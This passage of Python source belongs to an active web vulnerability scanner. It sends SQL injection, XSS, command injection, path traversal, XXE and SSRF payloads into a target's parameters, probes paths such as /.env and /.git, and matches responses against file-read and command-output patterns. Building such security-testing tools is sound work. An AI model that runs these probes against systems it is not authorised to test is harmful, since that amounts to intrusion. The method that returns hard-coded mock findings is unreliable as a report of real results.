        valid_scan_types = ['passive', 'active', 'full', 'SQLi', 'XSS', 'RCE', 'LFI']
        if scan_type not in valid_scan_types:
            scan_type = 'full'  # Default to full scan

        with self.scan_lock:
            self.active_scans[scan_id] = {
                'id': scan_id,
                'target_url': target_url,
                'scan_type': scan_type,
                'project_id': project_id,
                'status': 'running',
                'start_time': datetime.now(timezone.utc).isoformat(),
                'findings': [],
                'progress': 0,
                'stats': {
                    'total_requests': 0,
                    'vulnerabilities_found': 0,
                    'scan_duration': 0
                }
            }

        # Start scan in background thread
        thread = threading.Thread(
            target=self._run_actual_scan,#_run_scan
            args=(scan_id, target_url, scan_type, project_id),
            daemon=True
        )
        thread.start()

        return scan_id

    def _run_actual_scan(self, scan_id: str, target_url: str, scan_type: str, project_id: str):
        """Run ACTUAL vulnerability scanning"""
        try:
            with self.scan_lock:
                if scan_id not in self.active_scans:
                    return
                scan = self.active_scans[scan_id]

            logger.info(f"Starting actual scan of {target_url}")

            # ACTUAL SCANNING LOGIC
            findings = self._perform_actual_scanning(target_url, scan_type,project_id)

            with self.scan_lock:
                if scan_id in self.active_scans:
                    scan = self.active_scans[scan_id]
                    scan['findings'] = findings
                    scan['status'] = 'completed'
                    scan['progress'] = 100
                    scan['stats']['vulnerabilities_found'] = len(findings)
                    scan['stats']['scan_duration'] = 2.0  # Update with actual time

                    # Save findings via DatabaseWriter (async, no database locks)
                    self.db_writer.add_findings(scan_id, findings, project_id)

                    logger.info(f"Scan {scan_id} completed with {len(findings)} findings")

        except Exception as e:
            logger.error(f"Scan {scan_id} failed: {e}")

            with self.scan_lock:
                if scan_id in self.active_scans:
                    self.active_scans[scan_id]['status'] = 'failed'
                    self.active_scans[scan_id]['error'] = str(e)

    def _perform_actual_scanning(self, target_url: str, scan_type: str,project_id: str = None) -> List[Dict]:
        """Perform ACTIVE vulnerability scanning with payloads"""
        findings = []

        try:
            # Parse the target URL
            parsed_url = urllib.parse.urlparse(target_url)
            base_url = f"{parsed_url.scheme}://{parsed_url.netloc}"

            logger.info(f"Starting active scan of {target_url}")

            # Step 1: Passive scanning (check existing content)
            passive_findings = self._perform_passive_scanning(target_url,project_id)
            findings.extend(passive_findings)

            # Step 2: Active testing with payloads (if user wants)
            if scan_type in ['full', 'active']:
                active_findings = self._perform_active_testing(target_url, scan_type,project_id)
                findings.extend(active_findings)

            # Step 3: Common endpoint discovery and testing
            if scan_type == 'full':
                endpoint_findings = self._discover_and_test_endpoints(base_url,project_id)
                findings.extend(endpoint_findings)

            logger.info(f"Scan completed. Total findings: {len(findings)}")

        except Exception as e:
            logger.error(f"Error during active scanning: {e}")

        return findings

    def _perform_passive_scanning(self, target_url: str,project_id: str = None) -> List[Dict]:
        """Passive scanning - check existing content"""
        findings = []

        try:
            # Get initial response
            response = self._fetch_url(target_url)
            if not response:
                return findings

            # Parse request/response
            parsed_url = urllib.parse.urlparse(target_url)
            request_dict = self._create_request_dict('GET', target_url, {})
            response_dict = self._create_response_dict(response)

            # Run passive vulnerability checks
            findings = self.scan_request(request_dict, response_dict, project_id)

        except Exception as e:
            logger.error(f"Passive scanning error: {e}")

        return findings

    def _perform_active_testing(self, target_url: str, scan_type: str,project_id: str = None) -> List[Dict]:
        """ACTIVE testing with ALL payloads"""
        findings = []

        try:
            logger.info(f"Starting active payload testing on {target_url}")

            # Get initial response to analyze structure
            initial_response = self._fetch_url(target_url)
            if not initial_response:
                return findings

            # Parse parameters from URL
            parsed_url = urllib.parse.urlparse(target_url)
            query_params = self._parse_query_params(parsed_url.query)

            # Test each vulnerability type with its payloads
            if scan_type == 'full' or 'SQLi' in scan_type:
                findings.extend(self._test_sql_injection(target_url, query_params,project_id))

            if scan_type == 'full' or 'XSS' in scan_type:
                findings.extend(self._test_xss(target_url, query_params,project_id))

            if scan_type == 'full' or 'RCE' in scan_type:
                findings.extend(self._test_command_injection(target_url, query_params,project_id))

            if scan_type == 'full' or 'LFI' in scan_type:
                findings.extend(self._test_path_traversal(target_url, query_params,project_id))

            if scan_type == 'full' or 'XXE' in scan_type:
                findings.extend(self._test_xxe(target_url,project_id))

            if scan_type == 'full' or 'SSRF' in scan_type:
                findings.extend(self._test_ssrf(target_url, query_params,project_id))

            # Additional tests
            findings.extend(self._test_idor(target_url, query_params,project_id))
            findings.extend(self._test_csrf(target_url,project_id))
            findings.extend(self._test_security_headers(target_url,project_id))
            findings.extend(self._test_authentication(target_url,project_id))

        except Exception as e:
            logger.error(f"Active testing error: {e}")

        return findings

    def _fetch_url(self, url: str, timeout: int = 10) -> Optional[Any]:
        """Fetch URL with proper error handling"""
        try:
            import requests
            response = requests.get(url, timeout=timeout, verify=False, allow_redirects=True)
            return response
        except Exception as e:
            logger.debug(f"Failed to fetch {url}: {e}")
            return None

    def _parse_query_params(self, query_string: str) -> Dict[str, Union[str, List[str], Dict]]:
        """Parse query string parameters with support for JSON and complex structures"""
        params = {}

        if not query_string:
            return params

        try:
            # Try to detect JSON in query string
            if self._looks_like_json(query_string):
                return self._parse_json_params(query_string)

            # Standard URL query parsing
            parsed = urllib.parse.parse_qs(query_string, keep_blank_values=True, strict_parsing=False)

            for key, value in parsed.items():
                # Decode URL-encoded keys and values
                decoded_key = urllib.parse.unquote(key)

                if isinstance(value, list):
                    if len(value) == 0:
                        params[decoded_key] = ''
                    elif len(value) == 1:
                        # Single value
                        raw_value = value[0]
                        decoded_value = self._smart_decode_value(raw_value)
                        params[decoded_key] = decoded_value
                    else:
                        # Multiple values
                        decoded_values = [self._smart_decode_value(v) for v in value]
                        params[decoded_key] = decoded_values
                else:
                    # Shouldn't happen with parse_qs, but handle it
                    decoded_value = self._smart_decode_value(value)
                    params[decoded_key] = decoded_value

            # Handle edge cases
            params = self._handle_special_cases(params, query_string)

            logger.debug(f"Parsed parameters: {list(params.keys())}")

        except Exception as e:
            logger.error(f"Error parsing query params: {e}")
            params = self._parse_query_params_simple(query_string)

        return params

    def _smart_decode_value(self, value: Any) -> Union[str, Dict, List]:
        """Intelligently decode parameter values"""
        if value is None:
            return ''

        str_value = str(value)

        # URL decode
        decoded = urllib.parse.unquote(str_value)

        # Try to parse as JSON
        if self._looks_like_json(decoded):
            try:
                return json.loads(decoded)
            except:
                pass

        # Try to parse as base64
        if self._looks_like_base64(decoded):
            try:
                decoded_bytes = base64.b64decode(decoded + '=' * (-len(decoded) % 4))
                return decoded_bytes.decode('utf-8', errors='ignore')
            except:
                pass

        return decoded

    def _looks_like_json(self, text: str) -> bool:
        """Check if text looks like JSON"""
        text = text.strip()
        return (text.startswith('{') and text.endswith('}')) or \
            (text.startswith('[') and text.endswith(']'))

    def _looks_like_base64(self, text: str) -> bool:
        """Check if text looks like base64"""
        import re
        # Base64 regex pattern
        pattern = r'^[A-Za-z0-9+/]*={0,2}$'
        return bool(re.match(pattern, text)) and len(text) % 4 == 0

    def _parse_json_params(self, json_string: str) -> Dict:
        """Parse JSON parameters"""
        try:
            parsed = json.loads(json_string)

            # Flatten nested structures for scanning
            flattened = {}
            self._flatten_dict(parsed, '', flattened)
            return flattened

        except Exception as e:
            logger.error(f"Failed to parse JSON params: {e}")
            return {}

    def _flatten_dict(self, data: Any, prefix: str, result: Dict):
        """Flatten nested dictionary for scanning"""
        if isinstance(data, dict):
            for key, value in data.items():
                new_prefix = f"{prefix}.{key}" if prefix else key
                self._flatten_dict(value, new_prefix, result)
        elif isinstance(data, list):
            for i, value in enumerate(data):
                new_prefix = f"{prefix}[{i}]"
                self._flatten_dict(value, new_prefix, result)
        else:
            result[prefix] = str(data)

    def _handle_special_cases(self, params: Dict, query_string: str) -> Dict:
        """Handle special parameter cases"""

        # Handle array notation: param[]=value1&param[]=value2
        array_keys = [k for k in params.keys() if k.endswith('[]')]
        for array_key in array_keys:
            clean_key = array_key.rstrip('[]')
            if isinstance(params[array_key], list):
                params[clean_key] = params[array_key]
            else:
                params[clean_key] = [params[array_key]]
            del params[array_key]

        # Handle nested notation: param[key]=value
        nested_keys = [k for k in params.keys() if '[' in k and ']' in k]
        for nested_key in nested_keys:
            # Convert param[key] to param.key
            clean_key = nested_key.replace('[', '.').replace(']', '')
            params[clean_key] = params[nested_key]
            del params[nested_key]

        return params

    def _parse_query_params_simple(self, query_string: str) -> Dict[str, str]:
        """Simple robust parsing as last resort"""
        params = {}

        try:
            # Remove leading ? if present
            if query_string.startswith('?'):
                query_string = query_string[1:]

            pairs = query_string.split('&')
            for pair in pairs:
                if not pair:
                    continue

                if '=' in pair:
                    parts = pair.split('=', 1)
                    key = urllib.parse.unquote(parts[0].strip())
                    value = urllib.parse.unquote(parts[1].strip()) if len(parts) > 1 else ''
                else:
                    key = urllib.parse.unquote(pair.strip())
                    value = ''

                if key:
                    params[key] = value

        except Exception as e:
            logger.error(f"Simple parsing failed: {e}")

        return params

    def _test_sql_injection(self, target_url: str, query_params: Dict,project_id: str) -> List[Dict]:
        """Test for SQL injection vulnerabilities"""
        findings = []

        try:
            logger.info(f"Testing SQL injection on {target_url}")

            for param_name, param_value in query_params.items():
                for payload in self.payloads['SQLi']:
                    # Create test URL with payload
                    test_params = query_params.copy()
                    test_params[param_name] = payload

                    test_url = self._build_url_with_params(target_url, test_params)
                    response = self._fetch_url(test_url)

                    if response:
                        # Check if payload triggered SQL error
                        error_indicators = [
                            'SQL syntax', 'MySQL', 'PostgreSQL', 'SQLite',
                            'ORA-', 'Microsoft OLE DB', 'ODBC Driver',
                            'Unclosed quotation mark', 'Incorrect syntax'
                        ]

                        response_text = response.text.lower()
                        for indicator in error_indicators:
                            if indicator.lower() in response_text:
                                finding = self._create_finding(
                                    issue_type='SQL Injection',
                                    project_id=project_id,
                                    severity='High',
                                    confidence='Medium',
                                    url=test_url,
                                    parameter=param_name,
                                    description=f'SQL injection vulnerability found in parameter: {param_name}',
                                    detail=f'Payload: {payload} triggered SQL error: {indicator}',
                                    remediation='Use parameterized queries or prepared statements',
                                    evidence=f'Response contains SQL error indicator: {indicator}'
                                )
                                findings.append(finding)
                                break

        except Exception as e:
            logger.error(f"SQL injection test error: {e}")

        return findings

    def _test_xss(self, target_url: str, query_params: Dict,project_id: str ) -> List[Dict]:
        """Test for Cross-site Scripting vulnerabilities"""
        findings = []

        try:
            logger.info(f"Testing XSS on {target_url}")

            for param_name, param_value in query_params.items():
                for payload in self.payloads['XSS'][:10]:  # Test first 10 payloads
                    # Create test URL with XSS payload
                    test_params = query_params.copy()
                    test_params[param_name] = payload

                    test_url = self._build_url_with_params(target_url, test_params)
                    response = self._fetch_url(test_url)

                    if response:
                        # Check if payload is reflected in response
                        if payload in response.text:
                            finding = self._create_finding(
                                issue_type='Cross-site Scripting (XSS)',
                                project_id=project_id,
                                severity='Medium',
                                confidence='Medium',
                                url=test_url,
                                parameter=param_name,
                                description=f'Reflected XSS vulnerability found in parameter: {param_name}',
                                detail=f'XSS payload reflected in response: {payload[:50]}...',
                                remediation='Implement proper output encoding and input validation',
                                evidence='User input reflected without encoding'
                            )
                            findings.append(finding)

        except Exception as e:
            logger.error(f"XSS test error: {e}")

        return findings

    def _test_command_injection(self, target_url: str, query_params: Dict,project_id: str) -> List[Dict]:
        """Test for Command Injection vulnerabilities"""
        findings = []

        try:
            logger.info(f"Testing Command Injection on {target_url}")

            for param_name, param_value in query_params.items():
                for payload in self.payloads['RCE'][:5]:  # Test first 5 payloads
                    test_params = query_params.copy()
                    test_params[param_name] = payload

                    test_url = self._build_url_with_params(target_url, test_params)
                    response = self._fetch_url(test_url)

                    if response:
                        # Check for command execution indicators
                        error_patterns = [
                            r'(bash:|sh:|cmd:|powershell:)',
                            r'(command not found|No such file)',
                            r'(\d+\.\d+\.\d+\.\d+)',  # IP address in response
                            r'(root:|uid=|gid=|groups=)'
                        ]

                        for pattern in error_patterns:
                            if re.search(pattern, response.text, re.IGNORECASE):
                                finding = self._create_finding(
                                    issue_type='Command Injection',
                                    project_id=project_id,
                                    severity='Critical',
                                    confidence='Medium',
                                    url=test_url,
                                    parameter=param_name,
                                    description=f'Potential command injection in parameter: {param_name}',
                                    detail=f'Payload: {payload} may have executed commands',
                                    remediation='Validate and sanitize all user inputs',
                                    evidence=f'Response matches command injection pattern: {pattern}'
                                )
                                findings.append(finding)
                                break

        except Exception as e:
            logger.error(f"Command injection test error: {e}")

        return findings

    def _test_path_traversal(self, target_url: str, query_params: Dict,project_id: str) -> List[Dict]:
        """Test for Path Traversal vulnerabilities"""
        findings = []

        try:
            logger.info(f"Testing Path Traversal on {target_url}")

            for param_name, param_value in query_params.items():
                for payload in self.payloads['LFI'][:5]:  # Test first 5 payloads
                    test_params = query_params.copy()
                    test_params[param_name] = payload

                    test_url = self._build_url_with_params(target_url, test_params)
                    response = self._fetch_url(test_url)

                    if response:
                        # Check for file content indicators
                        file_indicators = [
                            'root:', 'daemon:', 'bin:', 'sys:', 'nobody:',
                            '/bin/', '/etc/', '/usr/', '/home/',
                            'Linux', 'Unix', 'Windows',
                            '<?php', '<%', '<script'
                        ]

                        response_text = response.text.lower()
                        for indicator in file_indicators:
                            if indicator.lower() in response_text:
                                finding = self._create_finding(
                                    issue_type='Path Traversal',
                                    project_id=project_id,
                                    severity='High',
                                    confidence='Medium',
                                    url=test_url,
                                    parameter=param_name,
                                    description=f'Potential path traversal in parameter: {param_name}',
                                    detail=f'Payload may have accessed sensitive files: {payload}',
                                    remediation='Implement proper file path validation',
                                    evidence=f'Response contains file system indicator: {indicator}'
                                )
                                findings.append(finding)
                                break

        except Exception as e:
            logger.error(f"Path traversal test error: {e}")

        return findings

    def _test_xxe(self, target_url: str,project_id: str) -> List[Dict]:
        """Test for XXE vulnerabilities"""
        findings = []

        try:
            logger.info(f"Testing XXE on {target_url}")

            # Only test if URL looks like it accepts XML
            response = self._fetch_url(target_url)
            if response and ('xml' in response.headers.get('Content-Type', '').lower() or
                             'application/xml' in response.headers.get('Content-Type', '').lower()):

                for payload in self.payloads['XXE'][:3]:  # Test first 3 payloads
                    # Send POST request with XML payload
                    headers = {'Content-Type': 'application/xml'}
                    response = self._post_url(target_url, payload, headers)

                    if response:
                        # Check for XXE exploitation indicators
                        if 'root:' in response.text or '/etc/passwd' in response.text:
                            finding = self._create_finding(
                                issue_type='XML External Entity (XXE)',
                                project_id=project_id,
                                severity='High',
                                confidence='Medium',
                                url=target_url,
                                parameter='XML body',
                                description='Potential XXE vulnerability',
                                detail=f'XXE payload may have read sensitive files',
                                remediation='Disable external entity processing in XML parsers',
                                evidence='Response contains sensitive file content'
                            )
                            findings.append(finding)
                            break

        except Exception as e:
            logger.error(f"XXE test error: {e}")

        return findings

    def _test_ssrf(self, target_url: str, query_params: Dict,project_id: str) -> List[Dict]:
        """Test for SSRF vulnerabilities"""
        findings = []

        try:
            logger.info(f"Testing SSRF on {target_url}")

            for param_name, param_value in query_params.items():
                # Only test URL parameters
                if 'url' in param_name.lower() or 'link' in param_name.lower() or 'uri' in param_name.lower():
                    for payload in self.payloads['SSRF'][:5]:  # Test first 5 payloads
                        test_params = query_params.copy()
                        test_params[param_name] = payload

                        test_url = self._build_url_with_params(target_url, test_params)
                        response = self._fetch_url(test_url, timeout=5)

                        # Just logging for SSRF (hard to detect automatically)
                        if response:
                            logger.debug(f"SSRF test sent payload {payload} to {param_name}")

        except Exception as e:
            logger.error(f"SSRF test error: {e}")

        return findings

    def _test_idor(self, target_url: str, query_params: Dict,project_id: str) -> List[Dict]:
        """Test for Insecure Direct Object References"""
        findings = []

        try:
            logger.info(f"Testing IDOR on {target_url}")

            # Look for numeric ID parameters
            for param_name, param_value in query_params.items():
                param_lower = param_name.lower()
                if any(id_word in param_lower for id_word in ['id', 'user', 'account', 'uid']):
                    if str(param_value).isdigit():
                        # Test with different IDs
                        test_ids = [str(int(param_value) + 1), str(int(param_value) - 1), '999999']

                        original_response = self._fetch_url(target_url)
                        if not original_response:
                            continue

                        for test_id in test_ids:
                            test_params = query_params.copy()
                            test_params[param_name] = test_id

                            test_url = self._build_url_with_params(target_url, test_params)
                            test_response = self._fetch_url(test_url)

                            if test_response and test_response.status_code < 400:
                                # Compare responses
                                if self._responses_similar(original_response.text, test_response.text, 0.8):
                                    finding = self._create_finding(
                                        issue_type='Insecure Direct Object References (IDOR)',
                                        project_id=project_id,
                                        severity='Medium',
                                        confidence='Low',
                                        url=test_url,
                                        parameter=param_name,
                                        description=f'Potential IDOR vulnerability with parameter: {param_name}',
                                        detail=f'Different ID ({test_id}) returned similar content',
                                        remediation='Implement proper authorization checks',
                                        evidence=f'Parameter {param_name} appears to be enumerable'
                                    )
                                    findings.append(finding)
                                    break

        except Exception as e:
            logger.error(f"IDOR test error: {e}")

        return findings

    def _test_csrf(self, target_url: str,project_id: str) -> List[Dict]:
        """Test for CSRF vulnerabilities"""
        findings = []

        try:
            logger.info(f"Testing CSRF on {target_url}")

            # Check if forms lack CSRF tokens
            response = self._fetch_url(target_url)
            if response:
                soup = BeautifulSoup(response.text, 'html.parser')
                forms = soup.find_all('form')

                for form in forms:
                    form_action = form.get('action', '')
                    form_method = form.get('method', 'get').upper()

                    # Check for state-changing methods without CSRF tokens
                    if form_method in ['POST', 'PUT', 'DELETE']:
                        csrf_inputs = form.find_all('input', {
                            'name': lambda x: x and any(token in x.lower() for token in ['csrf', 'token', 'nonce'])
                        })

                        if not csrf_inputs:
                            finding = self._create_finding(
                                issue_type='Cross-site Request Forgery (CSRF)',
                                project_id=project_id,
                                severity='Medium',
                                confidence='Low',
                                url=target_url,
                                parameter='N/A',
                                description='Form may be vulnerable to CSRF',
                                detail=f'{form_method} form at {form_action} lacks CSRF protection',
                                remediation='Implement anti-CSRF tokens',
                                evidence='No CSRF token found in form'
                            )
                            findings.append(finding)

        except Exception as e:
            logger.error(f"CSRF test error: {e}")

        return findings

    def _test_security_headers(self, target_url: str,project_id: str) -> List[Dict]:
        """Test for missing security headers"""
        findings = []

        try:
            logger.info(f"Testing Security Headers on {target_url}")

            response = self._fetch_url(target_url)
            if response:
                headers = response.headers

                security_headers = {
                    'Content-Security-Policy': 'Missing Content Security Policy header',
                    'X-Frame-Options': 'Missing X-Frame-Options header',
                    'X-Content-Type-Options': 'Missing X-Content-Type-Options header',
                    'Strict-Transport-Security': 'Missing HSTS header',
                    'Referrer-Policy': 'Missing Referrer-Policy header'
                }

                for header, description in security_headers.items():
                    if header not in headers:
                        finding = self._create_finding(
                            issue_type='Security Headers Missing',
                            project_id=project_id,
                            severity='Low',
                            confidence='High',
                            url=target_url,
                            parameter='N/A',
                            description=description,
                            detail=f'Header {header} is not present',
                            remediation=f'Implement {header} header',
                            evidence=f'Missing security header: {header}'
                        )
                        findings.append(finding)

        except Exception as e:
            logger.error(f"Security headers test error: {e}")

        return findings

    def _test_authentication(self, target_url: str,project_id: str) -> List[Dict]:
        """Test for authentication issues"""
        findings = []

        try:
            logger.info(f"Testing Authentication on {target_url}")

            parsed_url = urllib.parse.urlparse(target_url)

            # Check for HTTP basic auth over HTTP
            if parsed_url.scheme == 'http' and parsed_url.username:
                finding = self._create_finding(
                    issue_type='Broken Authentication',
                    project_id=project_id,
                    severity='High',
                    confidence='High',
                    url=target_url,
                    parameter='N/A',
                    description='Basic authentication over HTTP',
                    detail='Credentials transmitted in cleartext',
                    remediation='Use HTTPS for authentication',
                    evidence='Basic authentication used over HTTP'
                )
                findings.append(finding)

        except Exception as e:
            logger.error(f"Authentication test error: {e}")

        return findings

    def _discover_and_test_endpoints(self, base_url: str,project_id :str) -> List[Dict]:
        """Discover and test common endpoints"""
        findings = []

        try:
            logger.info(f"Discovering endpoints on {base_url}")

            common_endpoints = [
                '/admin', '/login', '/logout', '/register',
                '/wp-admin', '/wp-login.php', '/phpmyadmin',
                '/config', '/backup', '/api', '/graphql',
                '/swagger', '/swagger-ui', '/api-docs',
                '/.git', '/.env', '/.DS_Store',
                '/test', '/debug', '/console'
            ]

            for endpoint in common_endpoints:
                endpoint_url = base_url + endpoint
                try:
                    response = self._fetch_url(endpoint_url, timeout=3)
                    if response and response.status_code < 400:
                        # Found accessible endpoint
                        logger.info(f"Found accessible endpoint: {endpoint_url}")

                        # Test this endpoint with payloads
                        parsed_url = urllib.parse.urlparse(endpoint_url)
                        query_params = self._parse_query_params(parsed_url.query)

                        # Run quick tests on discovered endpoint

                        endpoint_findings = []
                        hard_find = self._perform_active_testing(endpoint_url,"full",project_id)
                        endpoint_findings.extend(hard_find)
                        endpoint_findings.extend(self._test_sql_injection(endpoint_url, query_params,project_id))
                        endpoint_findings.extend(self._test_xss(endpoint_url, query_params,project_id))

                        for finding in endpoint_findings:
                            finding['url'] = endpoint_url  # Update URL to endpoint
                            findings.append(finding)

                except:
                    continue

        except Exception as e:
            logger.error(f"Endpoint discovery error: {e}")

        return findings

    # Helper methods
    def _create_finding(self, issue_type: str,project_id: str, severity: str, confidence: str,
                        url: str, parameter: str, description: str,
                        detail: str, remediation: str, evidence: str) -> Dict:
        """Create a standardized finding dictionary"""
        return {
            'id': str(uuid.uuid4()),
            'project_id': project_id,
            'timestamp': datetime.now(timezone.utc).isoformat(),
            'issue_type': issue_type,
            'severity': severity,
            'confidence': confidence,
            'url': url,
            'parameter': parameter,
            'description': description,
            'detail': detail,
            'remediation': remediation,
            'evidence': evidence,
            'cvss_score': self._calculate_cvss_score(severity),
            'cwe_id': self._get_cwe_for_issue(issue_type),
            'owasp_category': self._get_owasp_for_issue(issue_type),
            'status': 'open',
            'request': '',
            'response': ''
        }

    def _build_url_with_params(self, base_url: str, params: Dict) -> str:
        """Build URL with query parameters, handling edge cases and encoding"""
        if not params:
            return base_url

        try:
            # Parse the base URL
            parsed = urllib.parse.urlparse(base_url)

            # Prepare parameters for encoding
            encoded_params = {}

            for key, value in params.items():
                # Skip None values
                if value is None:
                    continue

                # Encode the key
                encoded_key = self._safe_url_encode(str(key))

                # Handle different value types
                if isinstance(value, list):
                    # Handle list values
                    encoded_values = []
                    for item in value:
                        if item is not None:
                            encoded_values.append(self._safe_url_encode(str(item)))
                    if encoded_values:
                        encoded_params[encoded_key] = encoded_values
                elif isinstance(value, dict):
                    # Handle dictionary values (for nested params)
                    try:
                        # Convert dict to JSON string
                        json_value = json.dumps(value)
                        encoded_params[encoded_key] = self._safe_url_encode(json_value)
                    except:
                        # Fallback to string representation
                        encoded_params[encoded_key] = self._safe_url_encode(str(value))
                else:
                    # Handle single value
                    encoded_params[encoded_key] = self._safe_url_encode(str(value))

            if not encoded_params:
                return base_url

            # Build query string with proper encoding
            query_parts = []

            for key, value in encoded_params.items():
                if isinstance(value, list):
                    # Array parameters: param=value1&param=value2
                    for item in value:
                        query_parts.append(f"{key}={item}")
                else:
                    # Single parameter
                    query_parts.append(f"{key}={value}")

            query_string = '&'.join(query_parts)

            # Preserve existing query parameters if any
            if parsed.query:
                # FIX: Handle bytes/string conversion properly
                existing_params = {}

                # Check if query is bytes or string
                if isinstance(parsed.query, bytes):
                    query_str = parsed.query.decode('utf-8', errors='ignore')
                else:
                    query_str = parsed.query

                # Parse the query string
                existing_params = urllib.parse.parse_qs(query_str, keep_blank_values=True)

                # Merge with new params (new params override existing ones)
                for key, values in existing_params.items():
                    if key not in encoded_params:
                        for value_item in values:
                            # Ensure value_item is string before encoding
                            if isinstance(value_item, bytes):
                                value_str = value_item.decode('utf-8', errors='ignore')
                            else:
                                value_str = str(value_item)
                            query_parts.insert(0, f"{key}={self._safe_url_encode(value_str)}")

                query_string = '&'.join(query_parts)

            # Reconstruct URL
            new_parsed = parsed._replace(query=query_string)
            result = urllib.parse.urlunparse(new_parsed)

            # Validate the URL
            if not self._is_valid_url(result):
                raise ValueError(f"Invalid URL constructed: {result[:100]}...")

            return result

        except Exception as e:
            logger.error(f"Error building URL with params: {e}")
            # Fallback: append params as simple string
            return self._build_url_fallback(base_url, params)

    def _safe_url_encode(self, text: str) -> str:
        """Safely encode text for URL parameters"""
        try:
            # First encode special characters
            encoded = urllib.parse.quote(text, safe='')

            # Handle spaces (some servers expect + for spaces)
            encoded = encoded.replace('%20', '+')

            return encoded
        except Exception as e:
            logger.warning(f"Failed to encode '{text[:50]}...': {e}")
            # Fallback: basic encoding
            return text.replace(' ', '+').replace('&', '%26').replace('=', '%3D')

    def _is_valid_url(self, url: str) -> bool:
        """Check if URL is valid"""
        try:
            result = urllib.parse.urlparse(url)

            # Basic validation
            if not result.scheme or not result.netloc:
                return False

            # Check for dangerous characters
            dangerous_chars = ['\x00', '\r', '\n', '\t']
            for char in dangerous_chars:
                if char in url:
                    return False

            return True

        except Exception:
            return False

    def _build_url_fallback(self, base_url: str, params: Dict) -> str:
        """Fallback method for URL building"""
        try:
            # Simple string concatenation as fallback
            query_parts = []

            for key, value in params.items():
                if value is None:
                    continue

                if isinstance(value, list):
                    for item in value:
                        if item is not None:
                            query_parts.append(f"{key}={str(item)}")
                else:
                    query_parts.append(f"{key}={str(value)}")

            if not query_parts:
                return base_url

            query_string = '&'.join(query_parts)

            # Append to base URL
            if '?' in base_url:
                return f"{base_url}&{query_string}"
            else:
                return f"{base_url}?{query_string}"

        except Exception as e:
            logger.error(f"Fallback URL building also failed: {e}")
            return base_url

    def _create_request_dict(self, method: str, url: str, params: Dict) -> Dict:
        """Create request dictionary for scanning"""
        parsed_url = urllib.parse.urlparse(url)
        return {
            'method': method,
            'url' : url,
            'full_path': parsed_url.path + ('?' + parsed_url.query if parsed_url.query else ''),
            'headers': [('User-Agent', 'Yettie-Scanner/1.0')],
            'body': b'',
            'raw': b'',
            'parameters': params,
            'scheme': parsed_url.scheme,
            'content_type': ''
        }

    def _create_response_dict(self, response) -> Dict:
        """Create response dictionary for scanning"""
        return {
            'status_code': response.status_code,
            'headers': list(response.headers.items()),
            'body': response.content,
            'parsed_body': response.content,
            'raw': b'',
            'content_type': response.headers.get('Content-Type', '')
        }

    def _post_url(self, url: str, data: str, headers: Dict = None) -> Optional[Any]:
        """Send POST request"""
        try:
            import requests
            response = requests.post(url, data=data, headers=headers, timeout=10, verify=False)
            return response
        except:
            return None

    def _responses_similar(self, text1: str, text2: str, threshold: float = 0.8) -> bool:
        """Check if two responses are similar"""
        if not text1 or not text2:
            return False

        # Simple similarity check
        words1 = set(text1.lower().split())
        words2 = set(text2.lower().split())

        if not words1 or not words2:
            return False

        intersection = words1.intersection(words2)
        similarity = len(intersection) / max(len(words1), len(words2))

        return similarity >= threshold

    def _get_cwe_for_issue(self, issue_type: str) -> str:
        """Get CWE ID for issue type"""
        cwe_map = {
            'SQL Injection': 'CWE-89',
            'Cross-site Scripting (XSS)': 'CWE-79',
            'Command Injection': 'CWE-78',
            'Path Traversal': 'CWE-22',
            'XML External Entity (XXE)': 'CWE-611',
            'Server-Side Request Forgery (SSRF)': 'CWE-918',
            'Insecure Direct Object References (IDOR)': 'CWE-639',
            'Cross-site Request Forgery (CSRF)': 'CWE-352',
            'Security Headers Missing': 'CWE-693',
            'Information Disclosure': 'CWE-200',
            'Broken Authentication': 'CWE-287',
            'Insecure Session Management': 'CWE-614'
        }
        return cwe_map.get(issue_type, 'CWE-0')

    def _get_owasp_for_issue(self, issue_type: str) -> str:
        """Get OWASP category for issue type"""
        owasp_map = {
            'SQL Injection': 'A03:2021',
            'Cross-site Scripting (XSS)': 'A03:2021',
            'Command Injection': 'A03:2021',
            'Path Traversal': 'A01:2021',
            'XML External Entity (XXE)': 'A05:2021',
            'Server-Side Request Forgery (SSRF)': 'A10:2021',
            'Insecure Direct Object References (IDOR)': 'A01:2021',
            'Cross-site Request Forgery (CSRF)': 'A01:2021',
            'Security Headers Missing': 'A05:2021',
            'Information Disclosure': 'A01:2021',
            'Broken Authentication': 'A07:2021',
            'Insecure Session Management': 'A07:2021'
        }
        return owasp_map.get(issue_type, 'A00:2021')


    def _create_project_if_needed(self, project_id: str, target_url: str = ""):
        """Create project if it doesn't exist"""
        try:
            conn = db_manager.get_connection()
            cursor = conn.cursor()

            cursor.execute("SELECT id FROM projects WHERE id = ?", (project_id,))
            if not cursor.fetchone():
                cursor.execute("""
                    INSERT INTO projects (id, name, description, created, modified, status)
                    VALUES (?,?,?,?,?,?)
                """, (
                    project_id,
                    f'Project {project_id}',
                    f'Project for scanning {target_url}' if target_url else 'Scan project',
                    datetime.now(timezone.utc).isoformat(),
                    datetime.now(timezone.utc).isoformat(),
                    'active'
                ))
                conn.commit()
                logger.info(f"Created project: {project_id}")

        except Exception as e:
            logger.error(f"Failed to create project {project_id}: {e}")



    def _run_scan(self, scan_id: str, target_url: str, scan_type: str, project_id: str):
        """Run the actual scan"""
        try:
            # This is a simplified scan implementation
            # In a real scanner, this would crawl and test the target

            with self.scan_lock:
                if scan_id not in self.active_scans:
                    return

                scan = self.active_scans[scan_id]

            # Simulate scanning process
            time.sleep(2)  # Simulate scan time

            # Generate mock findings for demonstration
            mock_findings = [
                {
                    'issue_type': 'SQL Injection',
                    'severity': 'High',
                    'confidence': 'Medium',
                    'description': 'Potential SQL injection in login form',
                    'remediation': 'Use parameterized queries',
                    'url': target_url + '/login',
                    'parameter': 'username'
                },
                {
                    'issue_type': 'Cross-site Scripting (XSS)',
                    'severity': 'Medium',
                    'confidence': 'Low',
                    'description': 'Reflected XSS in search parameter',
                    'remediation': 'Implement output encoding',
                    'url': target_url + '/search',
                    'parameter': 'q'
                },
                {
                    'issue_type': 'Security Headers Missing',
                    'severity': 'Low',
                    'confidence': 'High',
                    'description': 'Missing security headers',
                    'remediation': 'Implement security headers',
                    'url': target_url,
                    'parameter': 'N/A'
                }
            ]

            with self.scan_lock:
                if scan_id in self.active_scans:
                    scan['findings'] = mock_findings
                    scan['status'] = 'completed'
                    scan['progress'] = 100
                    scan['stats']['vulnerabilities_found'] = len(mock_findings)
                    scan['stats']['scan_duration'] = 2.0

                    # Save findings to database
                    self._save_scan_results(scan_id, mock_findings, project_id)

        except Exception as e:
